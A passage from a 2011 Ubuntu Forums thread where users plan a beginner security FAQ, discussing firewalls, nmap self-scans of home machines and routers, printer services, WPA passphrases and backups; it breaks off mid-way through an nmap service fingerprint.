> My thoughts are flowing on this issue.  I recommend that at the outset you define the target audience for the FAQ.  

This FAQ is intended for the typical, average home user that is in the process of learning how to use Ubuntu. Average home use is:
1. surfing the net
2. playing games online & off line
3. on-line personal banking
4. storing documents that could contain a little sensitive information (like name, address, DOB, SSN, etc)
5. whatever else is typical.

This FAQ is NOT intended for
1. people who use Ubuntu in their corporate environment.  Certain industries must follow certain internet and data storage regulations.  Rely on this thread at your own peril for these uses.
2. If you're a home user that is employed by a company, and you occasionally work on company business on your home computer.  You should consult with your company's IT department to comply with their security measures.
3. Whoever else should be excluded.

This thread is progressing nicely. I think that we can do something valuable for the typical, average home user that is in the process of learning how to use Ubuntu. The eyes of us (beeing noobs) can help make the knowledge of the security gurus easier to understand :KS

Olle

---

### Post by BlinkinCat on 2011-11-02
> **Olle Wiklund said:**
> This thread is progressing nicely. I think that we can do something valuable for the typical, average home user that is in the process of learning how to use Ubuntu. The eyes of us (beeing noobs) can help make the knowledge of the security gurus easier to understand :KS

Olle

+1

If a FAQ guide results from this thread I for one will be very pleased - :)

---

### Post by Dangertux on 2011-11-02
In my opinion if you guys are serious about this, which you seem to be, this thread which has kind of derailed into another sec discussion might not be the best place. My suggestion would be to create the FAQ either together as a team, then post it in it's own thread or perhaps a wiki or something along those lines. It might increase the visibility and useability also would clean it up a lot with proper formatting, punctuation grammar spelling etc.

Then again, I still suspect by the time it's all said and done this will look like the security stickies if it is complete. In any case, if you need or want my help just hit me up.

Have fun

---

### Post by tartalo on 2011-11-02
> **Dangertux said:**
> perhaps a wiki

+1 
Very interested in where this thread is going to.

---

### Post by mr-woof on 2011-11-02
I'll be interested in giving you a hand with the wiki as well, if you need any, from another noob point of view :)

---

### Post by Ms. Daisy on 2011-11-02
> **Dangertux said:**
> In my opinion if you guys are serious about this, which you seem to be, this thread which has kind of derailed into another sec discussion might not be the best place. My suggestion would be to create the FAQ either together as a team, then post it in it's own thread or perhaps a wiki or something along those lines. It might increase the visibility and useability also would clean it up a lot with proper formatting, punctuation grammar spelling etc.
 
Then again, I still suspect by the time it's all said and done this will look like the security stickies if it is complete. In any case, if you need or want my help just hit me up.If I don't hear from MrLeek, then I will create a separate Wiki or sticky.  This thread is simply the birth of the idea.  I guess the difference I see between the existing security stickys and this one is to simplify it.  Distill it down so the brand-spanking-new 16-year-old user can implement some obvious first steps and feel OK about securing their new Ubuntu machine until they know enough to implement more complex things later.  Many have said (and I agree) that the current stickys are great, but they include some rather advanced ideas that are simply intimidating to the new user (or maybe I'm just speaking for myself there. I've got a huge amount to learn and that's daunting).  I see this "Beginner's Wiki" having links to the existing stickys a section for "once you've learned how Ubuntu works, you need to look into these things." Or "if you understand all of this, then you're ready to move on to the next stage of security... [link to existing stickys]."

And yes, I'll be hitting you and the other gurus up a lot if I do end up developing it.

---

### Post by Dangertux on 2011-11-02
Sounds good.  

I just feel like there is a lot of that material out there already though. In any case at the very least it will be a learning experience for those involved in the project.

P.S : I hate the term guru, I don't get paid enough to be a guru ;-)

---

### Post by haqking on 2011-11-02
> **Dangertux said:**
> Sounds good.  

I just feel like there is a lot of that material out there already though. In any case at the very least it will be a learning experience for those involved in the project.

P.S : I hate the term guru, I don't get paid enough to be a guru ;-)

+1

I prefer the term narcissist...LOL

Everytime i hear the word guru, i think of vegan and yoga.

Well as a project the wiki/faq or whatever you guys decide if you collaborate together on IRC or PM or whatever will be a good learning experience for you.

As already mentioned though most of it already exists in the stickies.  It isnt gonna get much simpler, if it does it is likely to be too thin on the ground.

An example would be, we are always talking about firewalls and ports, listening services etc...most people i know outside of the tech field throw the words around alot but couldnt tell me what a port is or does or the difference between UDP/TCP for example.  

You gonna cover those types of things ? because if you dont there will be no foundational understanding of the concepts you wish to convey,and if you do then you cant just cover that as you need to cover so much more if you know where im coming from.

You cant protect against something you dont know.

Security = ad nauseum ad infinitum

But lets hope this works out for you guys, you all seem so keen, dont worry security will soon kick it out of you...LOL ;-)

peace

---

### Post by vasa1 on 2011-11-02
Guest Session is possibly one "easy" security tool. Thoughts? At first glance it reminds me a bit of Sandboxie.

---

### Post by Ms. Daisy on 2011-11-02
> **vasa1 said:**
> Guest Session is possibly one "easy" security tool. Thoughts? At first glance it reminds me a bit of Sandboxie.I'm not reading it that way, hopefully someone else can chime in.  I don't have any experience with Guest Session.  Here's a quote from the wiki:> This [Guest Session] design shouldn't aim for ultimate security. In the use cases, the guest users are somewhat trusted and also observed while they work on the box. We do not design a solution that can resist half an hour of unobserved tampering. In particular, this is not strong enough to be a fully secure kiosk solution (which is why we require authentication from an existing user) That makes it sound like the "walls" aren't as strong as something like Sandboxie.

---

### Post by MrLeek on 2011-11-02
> **Ms. Daisy said:**
> If I don't hear from MrLeek, then I will create a separate Wiki or sticky. 

Go ahead and create a wiki Ms Daisy - whilst I'm not letting you steal the idea, I'm not dumb enough to ignore willing helpers or to try and go solo on this one (besides I'm visiting family for the next few days - I get to be an awesome uncle again!) :). Not dodging it - just can't think of a good place to host a wiki page - I thought the wiki.ubuntu.com would work, but I've can't find a way to add a new page!

To be honest I'm a little surprised at the really positive responses on this - wasn't expecting such a thing. The basic structure seems just fine - whilst the focus should be Linux or Ubuntu we can't ignore things like securing Firefox. So we end up with:

- how best to screw up on the internet!
- 10 (or 15) quick tips to make Ubuntu more secure "out of the box"
- how to lock down your browser
- banking on-line? consider these things first...
- make sense out of firewalls (aka how to ninja Dangertux's awesome firewall thread - kidding! :)) - this one is easy: a) read Dangertux's thead b) explain bits in newbie-speak
- etc

We also need to make sure we don't try and nail the whole thing in one go. Pick a subject, draft it out and then refine it.

It is important to highlight  what Dangertux, haqking and co are saying - we'll never create the perfect "do these things and all will be well" document. But a document that covers 90-95% of the basic screwups that people can make on the net has to be worth the effort - right?

...and I promise not to call the experts "gurus" any more - how about "security gods"? :P

Oh yeah - PM's to Ms Daisy and me if you wanna be a newbie or an expert on this please.

---

### Post by MrLeek on 2011-11-02
Sort-of figured out the wiki.ubuntu problem - I don't have the edit or create new page option. Probably because I created my Ubuntu signon about 20 minutes ago most likely!

---

### Post by SparTacux on 2011-11-02
ANOTHER TIP -  ANOTHER WISE SAYING

Don't Draw Attention to yourselves !
Tread carefully young Grasshopper ;-)

If you want good security experience go to the FBI site and call them a bunch of ladies who wear suspendies - Only Joking but you get the idea.

---

### Post by Thewhistlingwind on 2011-11-02
> **Dangertux said:**
> 
If you use Wireless access. Make sure you're using STRONG encryption, not WEP but WPA/WPA2 with a GOOD passphrase use all 63 characters, you only have to type it once anyway.

Not if your parents didn't set it up right to begin with. ;)

---

### Post by dFlyer on 2011-11-02
Why not just goto ShieldsUP and test your system, to see what holes you may have:

[https://www.grc.com/x/ne.dll?bh0bkyd2](https://www.grc.com/x/ne.dll?bh0bkyd2)

If your dual booting try it will your other OS also. Security is a factor, but common sense with proper web browsing plays a big roll in securing a desktop. Now if your running a server that's a totally different mater.

---

### Post by haqking on 2011-11-02
> **dFlyer said:**
> Why not just goto ShieldsUP and test your system, to see what holes you may have:

[https://www.grc.com/x/ne.dll?bh0bkyd2](https://www.grc.com/x/ne.dll?bh0bkyd2)

If your dual booting try it will your other OS also. Security is a factor, but common sense with proper web browsing plays a big roll in securing a desktop. Now if your running a server that's a totally different mater.

Before you go trusting GRC, so you know there is no such thing as a stealthed port

Also alot of people think if they use GRC and see no open or a bunch of stealthed ports that they dont need a firewall, that is not true

---

### Post by Thewhistlingwind on 2011-11-02
> **haqking said:**
> Before you go trusting GRC, so you know there is no such thing as a stealthed port

+1

Just nmap scan yourself.

---

### Post by OpSecShellshock on 2011-11-02
The perimeter is not the endpoint. Both will need to be dealt with.

---

### Post by MrLeek on 2011-11-02
> **Thewhistlingwind said:**
> 
Just nmap scan yourself.

Another FAQ topic/question there to fill in - won't be too complex to write. The hard part will be trying to have a generic "how to interpret the results".

I got two open ports (998 closed) when I did my scan@
```

PORT     STATE SERVICE
111/tcp  open  rpcbind
2049/tcp open  nfs

```

The latter might be related to the unRaid server I have, but is this good or bad?

Oh - and ShieldsUP claims both ports are running in stealth. Why that is might form part of the FAQ for nmap.

---

### Post by MrLeek on 2011-11-02
In fact, while I think about it - what do people here think about [www.navigators.com]("http://www.navigators.com")? Ryss Haynal seemed to know his stuff when I went to a presentation he gave a couple of years back...

---

### Post by crazyguy510 on 2011-11-02
Doesn't shields up scan the **public** IP that's assigned to your network? Doing an NMAP scan gives you basically the same results. Scanning your local addresses will show every port that's open on all of your LAN computers. From this, It would seem to me that GRC's shields up is correctly reporting the ports that are vulnerable from outside of your LAN.

A side question: Isn't a "stealth" port technically a port that has been filtered by your router or ISP? When a person goes scanning to look for open ports they get a response that several ports are closed, a few are open, and hundred or so are filtered. A filtered port would mean that the scanner could not determine whether the port was opened or closed. Would that be a correct interpretation?

---

### Post by Dangertux on 2011-11-02
> **crazyguy510 said:**
> Doesn't shields up scan the **public** IP that's assigned to your network? Doing an NMAP scan gives you basically the same results. Scanning your local addresses will show every port that's open on all of your LAN computers. From this, It would seem to me that GRC's shields up is correctly reporting the ports that are vulnerable from outside of your LAN.

A side question: Isn't a "stealth" port technically a port that has been filtered by your router or ISP? When a person goes scanning to look for open ports they get a response that several ports are closed, a few are open, and hundred or so are filtered. A filtered port would mean that the scanner could not determine whether the port was opened or closed. Would that be a correct interpretation?

Ugh I hate Shields Up. For one the site's scanner is horribly gimped against SPI firewalls making them seem like better protection then they actually are. Two they make up words "stealth" ports. There is no such thing. Really there isn't, I posted a comparison somwhere around here of what "stealth" vs "closed" looks like to an actual scanner (nmap) and there is literally no difference.

That being said, as was stated in this thread already. The permiter is NOT the end point. This is important to note, as most attacker's goal is to make it past the perimeter, and frankly, many of them are quite good at it.

In terms of iptables the difference between blue and green blocks on shields up are this.

GREEN ("stealth")
```

iptables -A INPUT -p tcp --dport 80 -j DROP

```BLUE ("closed")
```

iptables -A INPUT -p tcp --dport 80 -j REJECT

```It's important to understand that Shields up is not a definitive summary of your network's security, in fact its not even close. 

As far as filtered ports go, they can show up filtered for a variety of reasons. Usually for two major reasons. The first the port is actually open but is filtered by IP, meaning only certain IP's can connect to it, this is not done in the firewall, but rather the service. The second most common reason a port will come back as filtered under nmap is if iptables rate limiting or hash limiting is in place. Due to the way nmap scans many probes are sent to each port. If the threshold of how many probes are returned is not definitive the port may show as filtered with the message "is this port really open?"


Hope this helps

Also : Sent PM to both Ms. Daisy and MrLeek.

---

### Post by vasa1 on 2011-11-03
> **Ms. Daisy said:**
> I'm not reading it that way, hopefully someone else can chime in.  I don't have any experience with Guest Session.  Here's a quote from the wiki: That makes it sound like the "walls" aren't as strong as something like Sandboxie.

People in the other world talk about a layered approach so long as efficiency isn't affected.

---

### Post by WasMeHere on 2011-11-03
> **Dangertux said:**
> ...
A5) Again what about it? Force https, don't access it from public wifi  use NoScript.Make sure the rest of your system security is decent, IE: your samba service didn't get exploited because your printer was running a telnet server that you didn't know about and lexmark is bad with updates, and after all this now your home PC is keylogged and rootkitted because someone sniffed your ssh credentials via an ssh version attack
...
Should I check for a telnet server at my printer and switch it off, if I find one?

---

### Post by OpSecShellshock on 2011-11-03
> **Olle Wiklund said:**
> Should I check for a telnet server at my printer and switch it off, if I find one?

Let's back up a little. Do you have a networked printer? If yes, do you need one? If the printer doesn't need to be on the network, then don't put it there. From an introductory security perspective, this is the first thing to consider about almost any device.

Tangent: communication capability on internal networks has gotten to a point where you can do really cool things. Look at all those Win7 ads where everything in the house is talking to everything else! Sweet right? The computers practically do everything for you, which is the problem. The incentive of device manufacturers and OS developers is to make it so users don't have to understand how things work. That means they may well be working at cross purposes to your security needs. Until you do understand how it works, my recommendation would be to not set those things up, and if they are set up by default, disable them.

It is arguably a pain to have to transfer files to a USB stick or SD card in order to move them from one device to another (which carries its own risks, but that's another issue). However it is far less of a pain than having to rebuild every machine because something weird is happening and you don't know what it is or how it's happening or what kind of risks are involved and finding out would take longer than just starting fresh (if you even could find out).

---

### Post by MrLeek on 2011-11-03
> **Dangertux said:**
> 
If you use Wireless access. Make sure you're using STRONG encryption, not WEP but WPA/WPA2 with a GOOD passphrase use all 63 characters, you only have to type it once anyway.

Again - this is one of those easy "must do" things for good basic security. Yet there's loads of people (I was one of them!) that use good passphrases for WPA....but get nowhere near the 63 character limit!

So: [https://www.grc.com/passwords.htm](https://www.grc.com/passwords.htm) can help newbies generate good passwords and [https://www.grc.com/haystack.htm](https://www.grc.com/haystack.htm) can give an idea on just how good a password is. Yet, if you read the small print, you realise that there's more to it than that.

Shining a newbie light onto these things to help other newbies avoid the easy mistakes to make.

---

### Post by Ms. Daisy on 2011-11-03
> **OpSecShellshock said:**
> Let's back up a little. Do you have a networked printer? If yes, do you need one? If the printer doesn't need to be on the network, then don't put it there. From an introductory security perspective, this is the first thing to consider about almost any device. If you've got a networked device and it really does make life easier to have it networked, can you increase your security by simpling turning the device off when you don't need it?  Is a shut down device still hackable?

---

### Post by WasMeHere on 2011-11-03
> **OpSecShellshock said:**
> Let's back up a little. Do you have a networked printer? If yes, do you need one? If the printer doesn't need to be on the network, then don't put it there. From an introductory security perspective, this is the first thing to consider about almost any device ...

Yes, because I want access from several computers (for all members of the family). The alternative would be to have a server running all the time and print via the server, with those disadvantages. Or save paper and toner by making it hard for the children to connect to the printer ;-)

So if I have a network printer, would it be better to have only ftp and no telnet, or is it as bad in both cases?

Having fun finding out
Olle

[I]Edit: @ Ms. Daisy
Yes, I think so too, and I've been shutting the printer down anyway to save energy and decrease noise, so the kids have to start it to print, andt that is much easier and faster than to start a computer server.[/I]

---

### Post by OpSecShellshock on 2011-11-03
> **Ms. Daisy said:**
> If you've got a networked device and it really does make life easier to have it networked, can you increase your security by simpling turning the device off when you don't need it?  Is a shut down device still hackable?

As long as it's shut down hard it's probably fine. Pulling the network cable when it's not in use (or disabling the wireless, whatever) might be a suitable alternative. Sometimes that comes with a functionality drawback, though, in the sense that you can't always just fire it back up and have it work immediately (like it still might not show up as available/connected). Just one of the trade-offs to consider. It gets back to manufacturer's incentives: printers are not designed with security in mind, but are made for ease of use (yeah yeah, tell that to people who can't find Linux drivers!). Also to churn through ink cartridges as quickly as possible, but that's not really a security issue.

---

### Post by OpSecShellshock on 2011-11-03
> **Olle Wiklund said:**
> Yes, because I want access from several computers (for all members of the family). The alternative would be to have a server running all the time and print via the server, with those disadvantages. Or save paper and toner by making it hard for the children to connect to the printer ;-)

So if I have a network printer, would it be better to have only ftp and no telnet, or is it as bad in both cases?

Having fun finding out
Olle

As far as I'm concerned, use of both FTP and telnet is unacceptable. Others may not adopt such a hard line stance. I think most off-the-shelf printers support IPP, but can't really say since I don't remember being successful the last time I tried to set one up at home.

---

### Post by Ms. Daisy on 2011-11-03
> **OpSecShellshock said:**
> As long as it's shut down hard it's probably fine. Pulling the network cable when it's not in use (or disabling the wireless, whatever) might be a suitable alternative. Sometimes that comes with a functionality drawback, though, in the sense that you can't always just fire it back up and have it work immediately (like it still might not show up as available/connected). Just one of the trade-offs to consider. It gets back to manufacturer's incentives: printers are not designed with security in mind, but are made for ease of use (yeah yeah, tell that to people who can't find Linux drivers!). Also to churn through ink cartridges as quickly as possible, but that's not really a security issue.
Sorry to be dim, but what exactly do you mean by "shut down hard?" The physical on/off switch?

---

### Post by Dangertux on 2011-11-03
> **OpSecShellshock said:**
> As far as I'm concerned, use of both FTP and telnet is unacceptable. Others may not adopt such a hard line stance. I think most off-the-shelf printers support IPP, but can't really say since I don't remember being successful the last time I tried to set one up at home.

+1 to the FTP and telnet particularly telnet. stupidest service ever. There are SOME decent FTP servers but truthfully, they are still inferior to SSH in every way.

---

### Post by OpSecShellshock on 2011-11-03
> **Ms. Daisy said:**
> Sorry to be dim, but what exactly do you mean by "shut down hard?" The physical on/off switch?

Oh, sorry about that. Yes, I mean powered off completely. Some devices don't seem to want to do that, so they need to be unplugged.

EDITED to add: This is just advice for folks who haven't had the time yet to sit down and understand what's going on and evaluate the risks. I'm sure there are ways to set things up so they can always be on and perfectly fine, but it will involve a deeper understanding.

---

### Post by WasMeHere on 2011-11-03
> **Dangertux said:**
> ...
A5) Again what about it? Force https, don't access it from public wifi  use NoScript.Make sure the rest of your system security is decent, IE: your samba service didn't get exploited because your printer was running a telnet server that you didn't know about and lexmark is bad with updates, and after all this now your home PC is keylogged and rootkitted because someone sniffed your ssh credentials via an ssh version attack
...
> Should I check for a telnet server at my printer and switch it off, if I find one?

> **OpSecShellshock said:**
> As far as I'm concerned, use of both FTP and telnet is unacceptable. Others may not adopt such a hard line stance. I think most off-the-shelf printers support IPP, but can't really say since I don't remember being successful the last time I tried to set one up at home.
I found FTP and TFTP (telnet?) and switched them off. There are also
***SNMP, LPD, Raw Port, mDNS, LLMNR, LLTD***.
Why and what are these protocols, and should they be switched off? I guess it is enough with IPP.

Trying to bend the learning curve
Olle

---

### Post by Dangertux on 2011-11-03
> **Olle Wiklund said:**
> I found FTP and TFTP (telnet?) and switched them off. There are also
***SNMP, LPD, Raw Port, mDNS, LLMNR, LLTD***.
Why and what are these protocols, and should they be switched off? I guess it is enough with IPP.

Trying to bend the learning curve
Olle


Switching it off , is not the end all be all in terms of security. You first need to know if you utilize it or not (I'm guessing you don't since you didn't know it was there.)

No , TFTP is not telnet, it's trivial file transfer protocol, commonly used with PXE netbooting. 

SNMP - Simple Network Management Protocol , can be useful for attackers footprinting your network since public community strings often give out entirely too much information. Can also be useful in network diagnostics.

LPD - Line Printer Daemon Protocol , was essentially replaced by CUPS

mDNS - Multicast DNS (you probably need this)

LLMR - Link Local Multicast Name Resolution (you need this with mDNS)

LLTD - Link Layer Topology discovery. Again network discovery protocol

Which do you need? I don't know how is your network configured? This is where we discussed things get more complicated and suddenly it's not a newbie guide anymore...

---

### Post by WasMeHere on 2011-11-03
> **Dangertux said:**
> Switching it off , is not the end all be all in terms of security. You first need to know if you utilize it or not (I'm guessing you don't since you didn't know it was there.)
...
Which do you need? I don't know how is your network configured? This is where we discussed things get more complicated and suddenly it's not a newbie guide anymore...

You are right. This part is very specific and need not be in a newbie guide. I think newbies should be told to avoid network printers.

Olle

---

### Post by WasMeHere on 2011-11-03
**Backup**

I think that a *wiki or how-to  of security for newbies* should also have advice about backup. Security is not only addressing intrusion, but also making sure that your work (private data and configuration of the computer) is not lost.

There are many threads in the Ubuntu Forums, that describe problems, that would have been avoided with good backup. It is important to make regular backup well as special backup before certain risky operations like upgrading to a new version, operations on partitions and partition tables, using dd etc.

Olle

---

### Post by Ms. Daisy on 2011-11-03
> **Olle Wiklund said:**
> You are right. This part is very specific and need not be in a newbie guide. I think newbies should be told to avoid network printers.

OlleI think for these types of things I would like to see 

1. a very basic overview (printers are little computers on your network that can be accessed by malicious folks just like computers), 

2. some easy tips (so turn them off when you're not using them if you have to network devices, or don't network them if you can avoid it), 

3. and links to other already written resources for more in-depth information.

edit: and I agree, backing up is important and will be mentioned, I'll link to existing stickys & wikis so that we're not redundant in this new wiki.

---

### Post by MrLeek on 2011-11-03
> **Ms. Daisy said:**
> I think for these types of things I would like to see 

1. a very basic overview (printers are little computers on your network that can be accessed by malicious folks just like computers), 

2. some easy tips (so turn them off when you're not using them if you have to network devices, or don't network them if you can avoid it), 

3. and links to other already written resources for more in-depth information.

edit: and I agree, backing up is important and will be mentioned, I'll link to existing stickys & wikis so that we're not redundant in this new wiki.

I think this hits the spot for most things for this project. "what is it?", "best ways to screw up your security", "simple tricks to minimise the risk" - these things should be running through the heart of what we end up with.

I'm half tempted to volunteer Ollie for the network printer bit! :)

---

### Post by OpSecShellshock on 2011-11-03
> **Olle Wiklund said:**
> **Backup**

I think that a *wiki or how-to  of security for newbies* should also have advice about backup. Security is not only addressing intrusion, but also making sure that your work (private data and configuration of the computer) is not lost.

There are many threads in the Ubuntu Forums, that describe problems, that would have been avoided with good backup. It is important to make regular backup well as special backup before certain risky operations like upgrading to a new version, operations on partitions and partition tables, using dd etc.

Olle

I agree with this. Backups are an important component of another good newbie security strategy: be prepared to wipe and reinstall with very little notice.

---

### Post by MrLeek on 2011-11-03
For those reading through this we do want more newbies and security experts to get involved in this. A very rough divide:

- newbies: write the "how to's" based on how they understand what they've learnt about setting up firewalls, network printers, etc. Think of the guide that you would have wanted when setting up your firewall and write that!

- experts: make sure that the "how to's" are correct and don't compromise security. Help out by bridging the gap between the fundamentals that the newbies are wrestling with and the sources of material being used as reference.

A learning curve for newbies (and you should be learning this stuff anyway!) and a chance to teach for the experts. Win/win in my book!

---

### Post by Dangertux on 2011-11-03
Ehem...Umm just for the record you may want to edit your last post. The NVP thing was meant as a private joke and probably doesn't comply so well with the forum code of conduct =)

---

### Post by Ms. Daisy on 2011-11-03
I'm interested in dividing security into two realms (help me define them if I'm wrong):

1. desktop, non-server based network
2. server & network with server

And further, I think we should focus on non-server use.  

My (limited) understanding is that servers require extra security.  Therefore it's not a new user option, so we'll warn that the obvious simple advice for a newbie is to NOT INSTALL A SERVER.  Do [this] to check to make sure you're not running a server.

As a brand new user, you start talking about complicated server security & my eyes glaze over as my brain shuts down.  It has taken me considerable effort to determine which realm things fall in when they're mentioned on the forum, and I don't think I've been terribly successful.  

Does this division exist somewhere in written documents?  If you know of any, please post links.

---

### Post by CharlesA on 2011-11-03
> **Dangertux said:**
> Ehem...Umm just for the record you may want to edit your last post. The NVP thing was meant as a private joke and probably doesn't comply so well with the forum code of conduct =)
I see nothing.

I know one of my printers supports ftp (what for, I have no idea) and the other won't let me turn off mDNS.

I just leave them by since they aren't accessible from the internet anyhow.

---

### Post by MrLeek on 2011-11-03
> **CharlesA said:**
> I see nothing.


Nor do I anymore - well ok, you might if you look up the earlier post! :)

@ Dangertux - apologies for the joke. This doesn't work without folks like you on board.

---

### Post by MrLeek on 2011-11-03
> **Ms. Daisy said:**
> 
My (limited) understanding is that servers require extra security.  Therefore it's not a new user option, so we'll warn that the obvious simple advice for a newbie is to NOT INSTALL A SERVER.  Do [this] to check to make sure you're not running a server.

Big +1 for this - if you (the user) is hosting your own server then you should know what you're doing.

As an aside, how does an unRAID box fit into this server model? I use mine for backups and to stream movies (it's rarely on at the moment since I need to get a decent UPS)

---

### Post by Dangertux on 2011-11-03
> **Ms. Daisy said:**
> I'm interested in dividing security into two realms (help me define them if I'm wrong):

1. desktop, non-server based network
2. server & network with server

And further, I think we should focus on non-server use.  

My (limited) understanding is that servers require extra security.  Therefore it's not a new user option, so we'll warn that the obvious simple advice for a newbie is to NOT INSTALL A SERVER.  Do [this] to check to make sure you're not running a server.

As a brand new user, you start talking about complicated server security & my eyes glaze over as my brain shuts down.  It has taken me considerable effort to determine which realm things fall in when they're mentioned on the forum, and I don't think I've been terribly successful.  

Does this division exist somewhere in written documents?  If you know of any, please post links.

I think focusing on desktop security would be fine. Though I also think while desktops generally are not secured as well as a server, a lot more goes into securing a desktop then a server due to the fact its user expects it to do more than one or only a few tasks.

---

### Post by Ms. Daisy on 2011-11-03
> **CharlesA said:**
> I just leave them by since they aren't accessible from the internet anyhow.Maybe that's good advice for a newbie.  I frankly had no idea a printer had FTP capabilities, kinda mind blowing.  But anyway, maybe there's a simple way to make them inaccessible from the internet?  How did you accomplish that?

Help me understand- if I connect a printer to my non-server-based network (like into my router) so that all the computers can print to it, does that by default make the printer accessible to the world?  What if I connect the printer to one of the computers on that same non-server network directly? Is that any less accessible?  What if I internally share a printer connected directly to one of my computers? Is that the same as having it connected to my router?

---

### Post by MrLeek on 2011-11-03
> **Ms. Daisy said:**
> Maybe that's good advice for a newbie.  I frankly had no idea a printer had FTP capabilities, kinda mind blowing.  But anyway, maybe there's a simple way to make them inaccessible from the internet?  How did you accomplish that?


Well there's that HP printer that advertises that you can print to it from anywhere in the world:

[http://www.youtube.com/watch?v=I5s1QNfXGn4](http://www.youtube.com/watch?v=I5s1QNfXGn4)

Sure it looks easy to do. But I can think of practical jokes that take advantage of that (photoshop picture of friend and strip bar and print that at his home so that his wife sees...) - and I'm willing to bet that black-hats might try that to get into a system. So hopefully there's a way to set the security for it....and be simple to set up as well!

---

### Post by WasMeHere on 2011-11-03
> **ms. Daisy said:**
> i'm interested in dividing security into two realms (help me define them if i'm wrong):

1. Desktop, non-server based network
2. Server & network with server

and further, i think we should focus on non-server use.  

My (limited) understanding is that servers require extra security.  Therefore it's not a new user option, so we'll warn that the obvious simple advice for a newbie is to not install a server.  Do [this] to check to make sure you're not running a server.

As a brand new user, you start talking about complicated server security & my eyes glaze over as my brain shuts down.  It has taken me considerable effort to determine which realm things fall in when they're mentioned on the forum, and i don't think i've been terribly successful.  

Does this division exist somewhere in written documents?  If you know of any, please post links.
+1

---

### Post by Dangertux on 2011-11-03
> **Ms. Daisy said:**
> Maybe that's good advice for a newbie.  I frankly had no idea a printer had FTP capabilities, kinda mind blowing.  But anyway, maybe there's a simple way to make them inaccessible from the internet?  How did you accomplish that?

Help me understand- if I connect a printer to my non-server-based network (like into my router) so that all the computers can print to it, does that by default make the printer accessible to the world?  What if I connect the printer to one of the computers on that same non-server network directly? Is that any less accessible?  What if I internally share a printer connected directly to one of my computers? Is that the same as having it connected to my router?


SImple question with a somewhat complicated answer.

Ultimately whether or not the printer is accessible from anywhere in the world depends on the configuration of the printer, your network, and of course the router.

The same applies to it being shared over a computer.

And on the other question in the last few posts, yes an attacker can utilize a device such as a printer to gain access to an entire network? Also those fancy Cisco voip phones can be bad too lol.

---

### Post by CharlesA on 2011-11-03
> **Ms. Daisy said:**
> Maybe that's good advice for a newbie.  I frankly had no idea a printer had FTP capabilities, kinda mind blowing.  But anyway, maybe there's a simple way to make them inaccessible from the internet?  How did you accomplish that?

Help me understand- if I connect a printer to my non-server-based network (like into my router) so that all the computers can print to it, does that by default make the printer accessible to the world?  What if I connect the printer to one of the computers on that same non-server network directly? Is that any less accessible?  What if I internally share a printer connected directly to one of my computers? Is that the same as having it connected to my router?

Having uPNP turned off on the router is a start. ;)

> **Dangertux said:**
> SImple question with a somewhat complicated answer.

Ultimately whether or not the printer is accessible from anywhere in the world depends on the configuration of the printer, your network, and of course the router.

The same applies to it being shared over a computer.

Aye. I wish I could turn that stuff off on that printer, but the web interface and software make it look like there is no way to turn those services off.

---

### Post by Ms. Daisy on 2011-11-03
> **MrLeek said:**
> Well there's that HP printer that advertises that you can print to it from anywhere in the worldOMG THAT IS A TERRIBLE TERRIBLE IDEA (breathe Ms. Daisy, breathe. in... out... you'll be all right) 

Now that I've calmed down, maybe this can actually be addressed in a broad way.  "New technology sometimes gets out in front of security.  Everybody and their brother has a cloud, some of them seem to be in beta stages (not even fully baked).  Do you really understand what it means to park your valuable information in that cloud?  You can get a fancy printer that will allow any device anywhere to print to it, but do you really understand what kind of access that gives the world to your network?  
If you answered no, then it's important to understand the risks before you embrace a technology."

Dangertux- good point.  I'll add VOIP phones to the "don't do unless you have a clue" category. (Hey, I'm a poet!)

---

### Post by MrLeek on 2011-11-04
Any other topics that people can think of? One possible "quick tip" section is 10 ways to check to ensure that you're not running anything bad. So:

"Check to ensure that your firewall is working correctly by running nmap [your internal ip address] in a terminal window. If you get told that you have open ports then you'll need to do some additional investigation"

My results were (asked this earlier in the thread):

```

PORT     STATE SERVICE
111/tcp  open  rpcbind
2049/tcp open  nfs

```

I also scanned the IP address of my router and got a bit more scary results:

```

PORT      STATE SERVICE
80/tcp    open  http
5431/tcp  open  park-agent
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown

```

Good or bad?

The aim of this quick tip section (at least at this level) is not to guarantee security - instead it's simple ways to improve security.

---

### Post by MrLeek on 2011-11-04
Since I can only PM 1 person at a time until I hit 50 points (and it's annoying as hell to copy-paste everything!) I'm putting links to these forums threads here:

[http://ubuntuforums.org/showthread.php?t=1874684](http://ubuntuforums.org/showthread.php?t=1874684) - "router keeps getting hacked" and goes into simple ways to secure your router

[http://ubuntuforums.org/showthread.php?t=836559](http://ubuntuforums.org/showthread.php?t=836559) - "I found open ports" and trying to explain how a router has an internal IP address and an external IP addresses. Shields Up looks at the latter not the fomer.

Pulling something together in a very rough form to help answer the questions being covered here.

---

### Post by SparTacux on 2011-11-04
> **MrLeek said:**
> Any other topics that people can think of? One possible "quick tip" section is 10 ways to check to ensure that you're not running anything bad. So:

"Check to ensure that your firewall is working correctly by running nmap [your internal ip address] in a terminal window. If you get told that you have open ports then you'll need to do some additional investigation"

My results were (asked this earlier in the thread):

```

PORT     STATE SERVICE
111/tcp  open  rpcbind
2049/tcp open  nfs

```I also scanned the IP address of my router and got a bit more scary results:

```

PORT      STATE SERVICE
80/tcp    open  http
5431/tcp  open  park-agent
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown

```Good or bad?

The aim of this quick tip section (at least at this level) is not to guarantee security - instead it's simple ways to improve security.

You can get a more detailed view of those open ports on your router by using nmap with -sV to get service/version info details.

 nmap -sV -p80 192.168.0.1

Starting Nmap 5.00 ( [http://nmap.org](http://nmap.org) ) at 2011-11-04 13:26 GMT
Interesting ports on 192.168.0.1:
PORT   STATE SERVICE VERSION
80/tcp open  http really expensive TOP SECRET classified  router http config
Service Info: Device: Pentagon router 

In this example I probed port 80 on the router.
Do same for all open ports and see what info you get.

---

### Post by MrLeek on 2011-11-04
Quite an interesting response from that....

Starting Nmap 5.21 ( [http://nmap.org](http://nmap.org) ) at 2011-11-04 13:41 GMT
Nmap scan report for x.x.x.x
Host is up (0.00042s latency).
PORT      STATE SERVICE VERSION
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at [http://www.insecure.org/cgi-bin/servicefp-submit.cgi](http://www.insecure.org/cgi-bin/servicefp-submit.cgi) :
SF-Portxxxxx-TCP:V=5.21%I=7%D=11/4%Time=4EB3EBB6%P=x86_64-unknown-linux-gnu%r(RPCCheck,C0,"HTTP/0\.0\x20400\x20Bad\x20Request\r\nSERVER:\x20Linux/2\.
